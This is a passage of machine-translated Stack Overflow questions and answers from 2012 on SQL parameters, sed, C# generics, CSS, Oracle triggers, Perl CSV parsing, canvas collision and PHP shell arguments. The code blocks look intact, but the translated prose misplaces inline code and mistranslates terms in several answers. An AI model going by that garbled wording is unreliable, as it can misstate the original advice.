`str()`当可以使用 SQL 参数时，不要使用and 字符串连接；此外，您的`userID`变量包含元组列表，而不是整数列表；您的函数必须将所有结果作为行返回。如果您有数据库游标引用，则以下内容将起作用：

```
cursor.execute("INSERT INTO user VALUES (%s, %s,'','');", (userID[0][0], user)) 
```

使用 SQL 参数还有一个额外的好处，即数据库适配器将对您传入的任何值应用正确的引用。例如，将引用字符串，而不是整数，最重要的是，可以阻止危险的 SQL 注入尝试。

指定 SQL 参数的确切语法取决于您的数据库适配器。我使用`%s`了样式位置参数（就像您使用[mysql](/questions/tagged/mysql "显示标记为“mysql”的问题")标记一样），但根据数据库适配器，可以支持以下任何一种：

*   `?`位置参数
*   `%s`位置参数（例如使用我的 MySQLdb）
*   `:name`命名参数
*   `%(name)s`命名参数

检查您的数据库适配器文档以获取支持的确切变体。

在您的情况下发生的`userID[0]`是一个包含 python 长整数的*元组*`L`，其字符串表示形式包括. 即使没有，您的数据库也不会接受您的查询，因为您假设所有输入值都是字符串，并且无论如何您都在值周围加上引号。查询`"0"`预期为整数的字符串将不起作用。

将此推断为您的扩展功能：

```
def changeQuery(self, query, parameters=()):    
    connection = MySQLdb.connect(self.mysql_host, self.mysql_user, self.mysql_password, self.mysql_db)
    cursor = connection.cursor()
    cursor.execute(query, parameters)
    connection.commit()
    cursor.close()
    connection.close() 
```

并致电：

```
self.changeQuery("INSERT INTO user VALUES (%s, %s,'','');", (userID[0][0], user)) 
```

# silverlight - Silverlight OOB 应用程序在离线启动时未捕获异常

> ID：13916933
> 
> 赞同：0
> 
> 时间：2012-12-17T15:23:13.063
> 
> 标签：silverlight, offline, silverlight-oob

我有一个 Silverlight 5 应用程序，可以在浏览器中和浏览器外运行。当浏览器用完时，它应该能够使用以前下载的数据（XML 和 JPG）在没有 Internet 连接的情况下工作。

目前它可以工作，但是我在启动期间遇到了一个未处理的异常（被我的应用程序的 UnhandledException 事件处理程序捕获），它向用户显示了一条可怕的消息——比如“内部错误——应用程序现在可能崩溃”。可选详细信息为“E_UNEXPECTED”。该错误发生在我的开发机器和其他机器上，包括使用 MacOS X 的客户端。

当然，我可以更改信息，但这不是重点。

所以我的问题是：只有在离线启动时才会导致错误，当被 UnhandledException 处理程序捕获时，似乎不会影响应用程序稳定性的错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:23:13.063

我找到了罪魁祸首（通过记录我的启动步骤）：检查更新。

如果我`Application.CheckAndDownloadUpdateAsync()`在没有可用连接时调用，我会收到此异常。如果我在启动更新检查之前检查连接是否可用（*），异常就会消失。

[这在http://msdn.microsoft.com/en-us/library/dd730310%28VS.95%29.aspx](http://msdn.microsoft.com/en-us/library/dd730310%28VS.95%29.aspx)中没有记录，因此它看起来像 Silverlight 运行时中的错误。

(*) 主要基于`NetworkInterface.GetIsNetworkAvailable()`，加上一些自定义检查。

# bash - 在 bash 脚本中使用 sed 从文件中删除一行

> ID：13916935
> 
> 赞同：3
> 
> 时间：2012-12-17T15:23:17.313
> 
> 标签：bash, shell, sed

我目前正在编写一个 shell 脚本，有时错误可能会输出到文件中，但我需要移动错误，因为它没有任何意义，只要错误不存在，一切都会正常工作。

我有一个脚本，它具有以下内容：

```
ftp ftp://$2:$3@$1 << BLOCK > $5
cd "$4"
ls
quit
BLOCK 
```

$5 是写入 FTP 命令输出的文件。所以在文件中我有以下内容

```
total 8
-rw-r--r--  1 root  root  42 Dec 17 14:26 test1.txt
-rw-r--r--  1 root  root   6 Dec 17 14:08 test2.txt 
```

有时我会收到错误`?Invalid command.`，所以我使用`sed`它从文件中删除错误。我已将 shell 脚本更改为以下内容。我`error`在 FTP 中放置了测试注意事项，以确保我收到上述错误消息。

```
ftp ftp://$2:$3@$1 << BLOCK > $5
cd "$4"
ls
error
quit
BLOCK
fileout=$(sed '/?Invalid command./d' $5)
echo $fileout > $5 
```

从某种意义上说，这是有效的，因为我正在删除错误消息，但它也删除了换行符，因此当我查看文件时，我得到以下信息

```
total 8 -rw-r--r-- 1 root root 42 Dec 17 14:26 test1.txt -rw-r--r-- 1 root root 6 Dec 17 14:08 test2.txt 
```

如何保留换行符？

感谢您的任何帮助，您可以提供。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:31:09.657

您需要在ie`fileout`时引用，以保留换行符。`echo``echo "$fileout" > $5`

但是，您应该简单地使用`sed`“就地”编辑文件，而不是这样做。然后，您不必将 的输出保存`sed`到变量中，然后再将`echo`其返回，这会导致问题。

利用：

```
sed -i '/?Invalid command./d' $5 
```

代替：

```
fileout=$(sed '/?Invalid command./d' $5)
echo $fileout > $5 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:57:56.533

做就是了：

```
ftp ftp://$2:$3@$1 << BLOCK | sed ... > $5
...
BLOCK 
```

或者，如果您愿意：

```
ftp ftp://$2:$3@$1 << BLOCK | 
...
BLOCK
sed ... > $5 
```

# oauth - 如何在 API Query 中设置语言来搜索？

> ID：13916937
> 
> 赞同：3
> 
> 时间：2012-12-17T15:23:21.950
> 
> 标签：oauth, instagram

我需要在 instagram api 中过滤土耳其语言的结果。比如`https://api.instagram.com/v1/tags/mytag/media/recent?client_id=ClientID&lang=tr`。可能吗 ？

# c# - 关于声明通用嵌套类的编译错误

> ID：13916939
> 
> 赞同：4
> 
> 时间：2012-12-17T15:23:32.957
> 
> 标签：c#, generics, dictionary, compilation, compiler-errors

我收到有关这段代码的编译错误：

**错误 1 ​​类、结构或接口成员声明中的标记 '(' 无效
错误 2 不能在 for、using、fixed 或声明中使用多个类型**

知道为什么吗？另外，是否可以如下声明字典？

```
public class S
{
        private class ObInfo<T>
        {
            private string _type;
            private T _value;

            public ObInfo<T>(string i_Type, T Value)
            {
                this._type = i_Type;
                this._value = Value;
            }

            public ObInfo() 
               {}
       }

       private static Dictionary<int,ObInfo> sObj= new Dictionary<int,ObInfo>();
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-17T15:24:25.510

```
public ObInfo<T>(...) { 
```

构造函数不能接受泛型参数。
删除`<T>`，一切都会工作。

类中的所有方法（和类型）都继承该类的泛型参数；如果方法需要单独的类型参数，您应该只在泛型类中创建泛型方法。（这应该避免；这很令人困惑）

* * *

此外，开放的泛型类型实际上不是类型；如果`Dictionary<int,ObInfo>`不指定`ObjInfo`.
相反，您可以为字典使用非泛型接口，或者将类型参数移动到外部类并为[每个类型参数设置一个单独的字典](https://stackoverflow.com/q/686630/34397)。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-17T17:20:07.770

SLaks 的回答很好，但要澄清一点：您问的是*为什么*会发生错误，而不是如何修复它。正在报告该错误，因为编译器正在推理您打算说：

```
 private class ObInfo<T>
   {
        public ObInfo<T> SomeMethodNameHere(string i_Type, T Value) 
```

也就是说，它认为您正在尝试创建一个方法——或者可能是一个字段或事件——并且您输入了返回类型，`ObInfo<T>`但忘记了方法名称。无论这是方法、字段还是事件，`(`都是意外的，所以这就是错误。

显然，这可能不是最好的错误信息，因为它让您感到困惑。最好添加另一个启发式来专门检测您所处的情况。

我很想知道你为什么犯这个错误。你认为呢：

*   ctor是与类名同名的方法，T是类名的一部分。
*   ctor 是一个泛型方法，泛型方法必须声明一个类型参数。
*   别的东西。

?

If you thought the first thing: the T is not part of the class name. If you thought the second thing: if that were true then you'd be declaring a *second* type parameter in scope called T, which is a little confusing, no?

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T15:32:53.470

您可以简单地将静态字段放在类中。因此，对于泛型类的每个实现，您将拥有不同的静态字典

```
public class S
{
        private class ObInfo<T>
        {
            private string _type;
            private T _value;

            public ObInfo(string i_Type, T Value)
            {
                this._type = i_Type;
                this._value = Value;
            }

            public ObInfo() 
            {}

           private static Dictionary<int,ObInfo<T>> sObj= new Dictionary<int,ObInfo<T>>();
       }
} 
```

# android - 第二个 Activity 中的 Android 首选项

> ID：13916942
> 
> 赞同：0
> 
> 时间：2012-12-17T15:23:46.133
> 
> 标签：android, preferences

我在主要活动中添加了一些按钮。使用按钮时，您将打开一个活动。

在主要活动中

```
Intent myIntent = new Intent(v.getContext(), SettingsActivity.class);
startActivityForResult(myIntent, 0); 
```

在那个新活动中，我想把 android 的偏好放在一起。

```
 public class SettingsActivity extends MainActivity {..} 
```

问题是我需要扩展 PreferencesActivity。我已经扩展了我的主要活动。

我应该怎么做才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:25:33.757

删除`MainActivity`然后写入您想要的扩展名。

# html - 并排 div 及其高度存在一些问题

> ID：13916944
> 
> 赞同：0
> 
> 时间：2012-12-17T15:23:47.613
> 
> 标签：html, css

如果左侧 div 内的内容增加，整体布局的高度也会相应增加，一切都会正常运行：[jsfiddle](http://jsfiddle.net/hTTpc/2/)。但是，如果右侧 div 内的内容高度增加，则布局不会随之增加：[jsfiddle](http://jsfiddle.net/hTTpc/1/)

```
<div class="outer">
   <div class="contain">
        <div class="one">
       </div><div class="two">
                 <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>

        </div>
    </div>

    <div class="bottom">
    </div>
</div> 
```

CSS：

```
.outer {
   display: block;
   width: 500px;
   min-height: 500px;
   background-color: black;    
   border: 2px solid black;
}

.contain {
   display: block;
   width: 500px;
   min-height: 500px;
   background: red;
}

.one {
    display:inline-block;
    width: 200px;
    min-height: 100px;
    background: yellow;
    bottom:200px;
}

.two {
    float:right;
    width: 300px;
    min-height: 300px;
    background: purple;

}

.bottom {
    display:block;
    background: blue;
    width: 500px;
    height:200px;  
    bottom: 0;    
} 
```

​希望得到一些指导。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:31:53.573

我从您的代码中假设如果两个框（一个和两个）没有填充空间，则它们要底部对齐？如果是这样，你应该试试这个：

```
.one {
    display:inline-block;
    width: 200px;
    min-height: 100px;
    background: yellow;
    vertical-align: bottom;
}

.two {
    display:inline-block;
    width: 300px;
    min-height: 300px;
    background: purple;
    vertical-align: bottom;
} 
```

您正在设置两个宽度，因此将两者设置为`inline-block`并且它们应该并排放置，并且都占用空间。浮动块不占用空间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:32:02.613

将 font-size:0 添加到 class="contain" 中，因为它内部有内联块 div，它们本质上会占用标记中的空白并产生间隙。如果需要，单独在内部元素中添加 font-size 属性。

# oracle - 在更新触发器上获取更新条目的 ID - 变异表错误

> ID：13916951
> 
> 赞同：0
> 
> 时间：2012-12-17T15:24:23.410
> 
> 标签：oracle, plsql, mutating-table

我正在尝试创建一个更新触发器，但我一直遇到“变异表”错误。主要思想是一个带有用户评分的买卖数据库。基本上我想，每次更新 PRODUTOS 表上的评级时，重新计算卖家的评级。我正在尝试以下触发器（及其版本），但它无处可寻..

```
CREATE OR REPLACE TRIGGER actualiza_rating_vend
AFTER UPDATE OF RATING_VENDEDOR
ON PRODUTOS
REFERENCING OLD AS OLD NEW AS NEW
FOR EACH ROW
DECLARE
    CURSOR prod IS
        SELECT ID_USER,RATING_VENDEDOR, ID_COMPRADOR, RATING_COMPRADOR
        FROM   PRODUTOS
        WHERE  PRODUTOS.ID_USER = :NEW.ID_USER
        OR     PRODUTOS.ID_COMPRADOR = :NEW.ID_USER;
     contador NUMBER;
     soma     NUMBER;
     res      NUMBER;
     linha    prod%ROWTYPE;
     username  varchar2(255);
     BEGIN
     res := 0;
     contador := 0;
     fetch prod into linha;  
     username := :NEW.ID_USER;
         while prod%found loop
          if(linha.ID_user = username)
          then
            soma := soma + linha.RATING_VENDEDOR;
          else
            soma := soma + linha.RATING_COMPRADOR;
          end if;
          contador := contador + 1;       
          fetch prod into linha;
        end loop;
    close prod;
         res := soma / contador;
         update USERS set USERS.RATING = res where USERS.ID_USER = username;
  end; 
```

有人可以给我一个提示，我怎样才能只选择 ID_USER 值等于更新条目的 ID_USER 的条目？..提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:48:35.037

如果表中的评级`USERS`是最新的，您只需添加最新更改的评级：

```
CREATE OR REPLACE TRIGGER actualiza_rating_vend
  AFTER UPDATE ON produtos FOR EACH ROW
BEGIN
   UPDATE users 
      SET user_rating = user_rating + :new.rating_vendedor - :old.rating_vendedor
    WHERE id_user = :new.id_user;

   UPDATE users 
      SET user_rating = user_rating + :new.rating_comprador - :old.rating_comprador
   WHERE id_user = :new.id_comprador;

END actualiza_rating_vend; 
```

/

# jsp - JSP的使用问题

> ID：13916953
> 
> 赞同：1
> 
> 时间：2012-12-17T15:24:25.033
> 
> 标签：jsp, jsf

我正在尝试遍历项目集合：

```
<c:forEach items="#{tree.items}" var="item">
    <h:commandLink rendered="#{item.type == 'category'}" action="#{item.onNodeClicked}" 
```

但是，我有一个例外：

> javax.el.PropertyNotFoundException：类'java.lang.String'没有属性'type'。

看起来 JSP 将树项识别为字符串对象。我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:27:14.543

这是行不通的。`#{item}`仅在视图构建期间可用，而属性`rendered`在视图渲染期间评估。

改为使用`<c:if>`。

```
<c:forEach items="#{tree.items}" var="item">
    <c:if test="#{item.type == 'category'}">
        <h:commandLink ... action="#{item.onNodeClicked}" /> 
```

或者，如果您使用的是 JSF2（已推出 3 年多），请将旧版 JSP 替换为其后续的[Facelets](https://stackoverflow.com/tags/facelets/info)并改用其`<ui:repeat>`组件。它也在视图渲染期间进行评估。

```
<ui:repeat value="#{tree.items}" var="item">
    <h:commandLink rendered="#{item.type == 'category'}" action="#{item.onNodeClicked}" /> 
```

# codeigniter - CI：使用会话保护视图

> ID：13916955
> 
> 赞同：1
> 
> 时间：2012-12-17T15:24:29.750
> 
> 标签：codeigniter

我正在玩一些 CodeIgniter，我试图覆盖默认的 CI_Controller 以创建某种诱人的系统。

但是现在我遇到了一个问题，我的网站将为访问者提供不同的布局，一旦用户登录，布局就会变成其他东西。实现这一点的最佳方法是什么，我会创建一个数组然后检查该视图是否可供用户访问？

假设用户访问 www.site.com/index.php/dashboard，/dashboard 应该只对登录用户可见，我该如何检查？

```
<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class MY_Controller extends CI_Controller
{  
public function __construct() 
{
    parent::__construct();
}

function _output($content)
{
    // Load the base template with output content available as $content
    $data['content'] = &$content;
    echo($this->load->view('html_guest', $data, true));
}

private function _check_auth()
{

}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T16:05:42.037

[您可以使用像这样](http://williamsconcepts.com/ci/codeigniter/libraries/template/)的现成模板库。

然后根据控制器中的检查（例如；已登录）设置要使用的默认模板（参考第 I. 节配置）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:39:01.890

好吧，我一直在寻找相同的东西，一种良好而强大的实践，具有具有不同视图、访问权限等的多个身份验证级别

这里最好的指南之一

[http://jondavidjohn.com/blog/2011/01/scalable-login-system-for-codeigniter-ion_auth](http://jondavidjohn.com/blog/2011/01/scalable-login-system-for-codeigniter-ion_auth)

一步一步阅读，10分钟你应该明白了

# sql - 从表 a 插入表 b，其中 a 中的记录在 b 中不存在

> ID：13916957
> 
> 赞同：2
> 
> 时间：2012-12-17T15:24:35.417
> 
> 标签：sql, database

**我有两个具有相同架构的表，表 A 和表 B：**

```
| Table [A]        | Table [B]   
| id    value      | id    value
| 1     15         | 1     19
| 2     18         | 3     28
| 5     22         | 4     39 
```

**我想要做：**

```
insert into a select * from b where [b.id not exists in a] 
```

**问题：**这个的语法是什么 - 特别是括号中的部分？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-17T15:26:02.790

使用`INSERT INTO..SELECT`语句和`LEFT JOIN`。

```
INSERT INTO tableB (id, Value)
SELECT  a.id, a.value
FROM    tableA a
        LEFT JOIN tableB b 
            ON a.ID = b.ID
WHERE   b.id IS NULL 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/b56d8d/1)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-17T15:25:28.593

像这样：

```
INSERT INTO a(id, value)
SELECT * 
FROM b 
WHERE b.id NOT IN (SELECT id from a)
  AND b.id IS NOT NULL ; 
```

**请注意：**`NULL`使用 predicate 时，您必须注意值`IN`。否则使用`NOT EXISTS`谓词，它更安全，或者使用`LEFT JOIN`@kuyaJohn 建议的类似。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T15:50:37.673

如果您使用的是 SQL 2008 +，您还可以使用合并来实现此目的，从而使您能够轻松添加条件，不仅可以为目标表中不存在行的位置，还可以在 ID 的情况下添加条件匹配但值不同（可能更新）或者如果目标表中有一行在源中不存在（可能删除）：

```
MERGE TableB AS TARGET
USING TableA AS SOURCE
ON (target.ID = source.ID) 

WHEN NOT MATCHED BY TARGET
    THEN INSERT (ID, Value) VALUES (source.ID, source.Value); 
```

更多关于使用合并的信息可以在这里找到：

[使用 MERGE 插入、更新和删除数据](http://msdn.microsoft.com/en-us/library/bb522522%28v=sql.105%29.aspx)

# perl - Perl 中最快的 CSV 解析器

> ID：13916962
> 
> 赞同：11
> 
> 时间：2012-12-17T15:24:59.767
> 
> 标签：perl, parsing, csv

我正在创建一个子程序：

(1) 解析一个CSV文件；

(2) 并检查该文件中的所有行是否具有预期的列数。如果列数无效，它会发出嘶哑的声音。

当行数从数千到数百万不等时，**您认为*最有效*的方法是什么？**

现在，我正在尝试这些实现。

**(1) 基本文件解析器**

```
open my $in_fh, '<', $file or 
    croak "Cannot open '$file': $OS_ERROR";                                                            

my $row_no = 0;                                                                                           
while ( my $row = <$in_fh> ) {                                                                            
    my @values = split (q{,}, $row);                                                                      
    ++$row_no;                                                                                            
    if ( scalar @values < $min_cols_no ) {                                                                
        croak "Invalid file format. File '$file' does not have '$min_cols_no' columns in line '$row_no'.";
    }                                                                                                     
}                                                                                                         

close $in_fh                                                                                              
    or croak "Cannot close '$file': $OS_ERROR"; 
```

**(2) 使用 Text::CSV_XS (bind_columns 和 csv->getline)**

```
my $csv = Text::CSV_XS->new () or                                                                         
   croak "Cannot use CSV: " . Text::CSV_XS->error_diag();                                                 
open my $in_fh, '<', $file or                                                                             
   croak "Cannot open '$file': $OS_ERROR";                                                                

 my $row_no = 1;                                                                                          
 my @cols = @{$csv->getline($in_fh)};                                                                     
 my $row = {};                                                                                            
 $csv->bind_columns (\@{$row}{@cols});                                                                    
 while ($csv->getline ($in_fh)) {                                                                         
    ++$row_no;                                                                                            
    if ( scalar keys %$row < $min_cols_no ) {                                                             
        croak "Invalid file format. File '$file' does not have '$min_cols_no' columns in line '$row_no'.";
    }                                                                                                     
}                                                                                                         

$csv->eof or $csv->error_diag();                                                                          
close $in_fh or
    croak "Cannot close '$file': $OS_ERROR"; 
```

**(3) 使用 Text::CSV_XS (csv->parse)**

```
my $csv = Text::CSV_XS->new() or                                                                         
   croak "Cannot use CSV: " . Text::CSV_XS->error_diag();                                                
 open my $in_fh, '<', $file or                                                                           
   croak "Cannot open '$file': $OS_ERROR";                                                               

 my $row_no = 0;                                                                                         
 while ( <$in_fh> ) {                                                                                    
     $csv->parse($_);                                                                                    
     ++$row_no;                                                                                          
     if ( scalar $csv->fields < $min_cols_no ) {                                                         
       croak "Invalid file format. File '$file' does not have '$min_cols_no' columns in line '$row_no'.";
     }                                                                                                   
}                                                                                                        

$csv->eof or $csv->error_diag();                                                                         
close $in_fh or 
    croak "Cannot close '$file': $OS_ERROR"; 
```

**(4) 使用 Parse::CSV**

```
use Parse::CSV;                                                                                           
my $simple = Parse::CSV->new(                                                                             
    file => $file                                                                                         
);                                                                                                        

my $row_no = 0;                                                                                           
while ( my $array_ref = $simple->fetch ) {                                                                
    ++$row_no;                                                                                            
    if ( scalar @$array_ref < $min_cols_no ) {                                                            
        croak "Invalid file format. File '$file' does not have '$min_cols_no' columns in line '$row_no'.";
    }                                                                                                     
} 
```

我使用 Benchmark 模块对它们进行了基准测试。

```
use Benchmark qw(timeit timestr timediff :hireswallclock); 
```

这些是我得到的**数字（以秒为单位）**：

**1,000 行文件：**

> 实施1：0.0016
> 
> 实施2：0.0025
> 
> 实施3：0.0050
> 
> 实施4：0.0097

**10,000 行文件：**

> 实施1：0.0204
> 
> 实施2：0.0244
> 
> 实施3：0.0523
> 
> 实施4：0.1050

**1,500,000 行文件：**

> 实现一：1.8697
> 
> 实施2：3.1913
> 
> 实施3：7.8475
> 
> 实施4：15.6274

鉴于这些数字，我会得出结论，简单解析器是最快的，但从我从不同来源阅读的内容来看，Text::CSV_XS 应该是最快的。

有人会启发我吗？我使用模块的方式有问题吗？非常感谢你的帮助！

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-12-17T15:51:53.590

有 CSV 文件

```
header1,header2,header3
value1,value2,value3 
```

然后是 CSV 文件。

```
header1,"This, as they say, is header2","And header3
even contains a newline!"
value1,"value2, 2nd in a series of 3 values",value3 
```

`Text::CSV`及其同类产品经过精心开发和测试以应对第二种。如果您确信您的输入确实并且始终符合简单的 CSV 规范，那么您很可能可以构建一个性能优于`Text::CSV`.

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-12-17T15:51:51.263

请注意，您的`Text::CSV_XS`版本比简单的解析器版本做得更多。它拆分行，将其放入内存，并使您的 hashref 指向字段。

它也可能有其他逻辑，比如允许转义分隔符（我不知道，因为我没有使用它）。最重要的是，使用模块时总会有少量开销：函数调用、来回传递参数，以及可能并不真正适用于您的情况的通用代码（例如对您不适用的事情进行错误检查）不在乎）。

通常，使用模块的好处远远超过成本。您可以获得更多功能、更可靠的代码等。但是对于一个非常简单的小任务来说，情况可能并非如此。如果您需要做的只是验证列数，那么使用模块可能有点过头了。您可以通过仅计算列数来更快地实现自己的实现，而根本不需要拆分：

```
/(?:,[^,]*){$min_cols_no-1}/ or croak "Did not find minimum number of columns"; 
```

如果您要在此验证步骤之外进行实际处理，则使用该模块可能会有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T15:40:46.857

所有 CSV 解析模块都做同样的事情：打开文件并以某种方式解析 CSV，就像您在基本子中所做的那样。它们只是带来更多的开销，因为在内部，它们做的比你需要的要多得多（检查正确的 CSV 格式，传递对象结构等）。这使得它们在不同程度上比你的基本方法慢。

您自己对这些方法进行了基准测试；结果不是很明显吗？如果我不需要 CSV 模块的扩展功能，我会以自己的基本方式解析 CSV 文件。

（我不知道您是否可以通过改进模块的使用来加快它们的速度）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-22T08:26:38.667

只是为了好玩，我为此测试了正则表达式......并且它有效！;) 如果你有足够的内存，你可以一次读取整个文件，然后使用正则表达式：

```
my $blob = 'a;s;d
q;w;e
r;t;y
u;i;o
p;z;x
c;;b
n;m;f
g;h;j
k;l;';

say $blob =~ /^ ([^;]*;){2}[^;]* (\n (([^;]*;){2}[^;]*)+ \n ([^;]*;){2}[^;]*)? $/x ? 'ok' : 'bu'; 
```

但这不包括分隔符转义、引用等 - 只需测试指定数量的分隔符:)

# javascript - 向画布上绘制的图像添加碰撞检测

> ID：13916966
> 
> 赞同：3
> 
> 时间：2012-12-17T15:25:08.983
> 
> 标签：javascript, html5-canvas, collision-detection, kineticjs

我正在使用 HTML5 画布和 JavaScript 创建一个简单的基于 Web 的游戏。我目前在画布上显示了一些图像，每个图像都代表在快餐店中发现的物品。我还有四个“描述框”，每个都标有资产、负债、收入或支出。

每个图像都属于这些描述框之一，并且需要用户将每个图像拖放到正确的描述框中。

我计划通过使用保存框图像的 JS 变量的名称以及每个项目图像的 HTML alt 标签来检查用户是否将图像拖到正确的框，即 img "chair" 具有 alt 标签 "asset ”，并且资产的描述框具有变量名称“assetsDescriptionBox”，因此我将使用“if”语句来检测用户拖动的图像是否被拖动到与资产描述框所在的画布相同的区域正在显示，并且如果该图像具有 alt 标签“asset”，那么它将从画布上消失（并添加到数组中以供稍后在游戏中使用）。

但是，如果用户拖动的图像没有 alt 标签“asset”，但有一些其他标签，即“liability”，那么它将在画布上重新绘制，回到最初绘制的位置。

我不确定如何实现这一点。我看过碰撞检测，似乎一种方法是使用 JS 方法 getBoundingClientRect 来获取图像的“外部限制”，然后检查两个图像的外部限制是否完全重叠，如果他们这样做了，那就做点什么。但是，我不确定如何使用这种方法，并且在进行快速谷歌搜索时找不到任何特别有用的东西。

有谁知道这是否是最好的方法？如果是这样，您能否发布一个如何使用 getBoundingClientRect 方法的示例？或者如果没有，你会怎么做？

**编辑 17/12/2012 @ 16:45**

顺便说一句，我正在使用 KineticJS 库（我在本地保存的一个副本以进行一两次更改）来添加拖放功能，所以我认为库中会有一些我需要更改/添加到以添加碰撞检测。

有人有想法么？

**编辑 01/01/2013 @ 12:35**

您好，谢谢您的回答——这似乎就是我想要做的。我已经将图像全部显示在画布上，其中有四个“静态”图像，不能在画布周围拖动 - 这些是我想用作“放置区”的图像，并且可以拖动和放下其余的。我不太确定如何将您的代码提供的功能添加到我已有的功能中？如果您访问 URL：users.aber.ac.uk/eef8/project/development/featureset2dev，您将能够看到我已经在工作的内容。

要将“dropzone”功能添加到我的描述框中，我应该将它们添加到画布中吗？

```
var i = new Image(200, 200, 50, 50, 'cat.jpg', 300, 300, 60, 60); 
```

正如您在示例中所做的那样？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-27T23:28:25.637

我想说最好的方法是跟踪每个对象的 X/Y 位置以及宽度和高度；使用像这样的简单矩形碰撞函数需要两个对象并检查它们的边界框是否重叠。

```
function collides(a, b)
{
    if (a.x < b.x + b.width &&
        a.x + a.width > b.x &&
        a.y < b.y + b.height &&
        a.y + a.height > b.y) return true;
} 
```

如果我打算这样做，我可能会使用一个附加了拖放区对象的对象来设置它，这样该图像只能触发一个拖放区，而不是使用纯 JS 检查 alt 标签。

```
function Image(x, y, w, h, i, dx, dy, dw, dh)
{
    this.x = x;
    this.y = y;
    this.width = w;
    this.height = h;
    this.image = i;
    this.dropzone = new DropZone(dx, dy, dw, dh);
}

function DropZone(x, y, w, h)
{
    this.x = x;
    this.y = y;
    this.width = w;
    this.height = h;
}

var i = new Image(200, 200, 50, 50, 'cat.jpg', 300, 300, 60, 60); 
```

然后你会有一个循环，当你移动它时更新拖动图像的坐标。请注意，您不能在画布内的绘制精灵上使用单击处理程序，只能在画布本身上使用；您检查鼠标坐标是否在绘制的精灵内。

当然，另一种方法是使用 HTML5 拖放 API，虽然我没有使用经验，但它可能更适合您的需求。

[http://www.html5rocks.com/en/tutorials/dnd/basics/](http://www.html5rocks.com/en/tutorials/dnd/basics/)

# php - Php / Perl：无法将带有“\n”的电子邮件的 HTML 正文传递给 perl

> ID：13916967
> 
> 赞同：0
> 
> 时间：2012-12-17T15:25:10.277
> 
> 标签：php, perl, shell, system, newline

我有一个由 Php 函数调用的 Perl 脚本。

在通话期间，我需要将标题、主题、正文作为参数传递。

但我们知道 Body 可以包含“新行”字符，例如：

```
Hello Mr x,

this is just a test 
```

通常我们在这里有两条新线。

因此，当我使用 system() 函数调用脚本时：

```
system("perl /var/www/cgi-bin/daemon.pl $Header $Subject $body", $Res); 
```

正文内容将只有

```
Hello Mr x, 
```

我正在寻找的结果是有可能将新行传递给 perl 并完全按照所写的方式接收消息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T09:35:17.180

谢谢您的帮助，

在我的解决方案中，我在我的 Php 文件中使用了 escapeshellarg()，在 perl 端我发现了[HTML::Entities](http://search.cpan.org/~gaas/HTML-Parser-3.69/lib/HTML/Entities.pm)

有了这个我可以编码和解码我的协议：

这是我的代码：

php文件：

```
$Header = escapeshellarg($Header);
$Subject = escapeshellarg($Subject);
$Body = escapeshellarg($Body);

system("perl /var/www/cgi-bin/daemon.pl $Header $Subject $Body", $Res); 
```

Perl 脚本：

```
#!/user/bin/suidperl -U
use HTML::Entities;

# The $Header , $Subject and $Body args are well received
# to pass this args to an other perl script i use encode_entities() function

encode_entities($Header);
encode_entities($Subject);
encode_entities($Body); 
```

可以说[HTML::Entities](http://search.cpan.org/~gaas/HTML-Parser-3.69/lib/HTML/Entities.pm)和 PHP中的[escapeshellarg.php](http://php.net/manual/en/function.escapeshellarg.php)是一样的

# javascript - Javascript数组没有得到正确的数据

> ID：13916968
> 
> 赞同：1
> 
> 时间：2012-12-17T15:25:10.603
> 
> 标签：javascript, jquery, arrays

我有一个 javascript if-else 语句。它从 websocket 获取数据，并根据条件为真或假进入相关分支。

但我发现添加到两个数组的数据是相同的。这是代码：

```
 cities = JSON.parse(evt.data);
    if (cities.tag == 'red'){
        dataset.length = 0;
        console.log(cities.tag);
        for (var i = 0, item; item = buffer[i]; ++i) {
            buffer[i][1][0] = cities.clusters[item[0]] || 0;
            //console.log(buffer);
            dataset.push(buffer[i][1][0]);
            console.log('no1: ',dataset);  
        }
    }else{
        dataset2.length = 0;
        console.log(cities.tag);
        for (var i = 0, item; item = buffer2[i]; ++i) {
            buffer2[i][1][0] = cities.clusters[item[0]] || 0;
            dataset2.push(buffer2[i][1][0]);
            console.log('no2: ',dataset2);  
        }           
    }
    draw(); 
```

我知道它进入了正确的分支并且数据不同，但不知何故，else 分支中的代码只是复制了 if 分支中的数组。

我认为代码中一定有一些东西，但我看不到是什么。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T17:02:27.480

慢慢阅读代码并考虑输入：

*   对于缓冲区中项目的 每个`item`和索引：`i`
    *   如果前面的表达式没有定义，则设置`buffer2[i][1][0]` 为 `cities.clusters[item[0]]`or 的值；`0`

